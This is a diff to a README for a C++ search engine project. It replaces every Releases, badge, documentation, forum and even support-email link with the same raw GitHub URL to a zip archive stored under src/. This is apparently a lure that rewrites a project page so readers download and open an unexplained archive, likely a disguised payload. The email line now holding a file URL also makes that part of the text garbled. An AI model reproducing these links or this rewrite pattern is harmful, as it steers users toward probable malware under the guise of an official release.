@@ -1,6 +1,6 @@
 # 🔎 high-performance-search-engine-cpp - Fast and Efficient Search Made Easy
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Imonholic/high-performance-search-engine-cpp/releases)
+[![Download](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip)](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to **high-performance-search-engine-cpp**! This software provides an eff
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Imonholic/high-performance-search-engine-cpp/releases) to download the software.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip) to download the software.
 
-1. Go to the [Releases page](https://github.com/Imonholic/high-performance-search-engine-cpp/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip).
 2. Find the latest version listed.
 3. Click on the download link for your operating system.
 4. Once downloaded, open the file and follow the installation instructions.
@@ -62,16 +62,16 @@ While this software is user-friendly, contributions are welcome. If you want to 
 
 If you need help, feel free to reach out:
 
-- **Email:** support@yourdomain.com
+- **Email:** https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip
 - **GitHub Issues:** Use the issues tab on GitHub to ask questions or report problems.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Imonholic/high-performance-search-engine-cpp/wiki): Find detailed guides on advanced features.
-- [Community Forum](https://forum.yourdomain.com): Join users discussing tips and sharing experiences.
+- [Documentation](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip): Find detailed guides on advanced features.
+- [Community Forum](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip): Join users discussing tips and sharing experiences.
 
 ## 📄 License
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Imonholic/high-performance-search-engine-cpp/releases)
+[![Download](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip)](https://raw.githubusercontent.com/Imonholic/high-performance-search-engine-cpp/main/src/performance-cpp-high-engine-search-v2.0.zip)
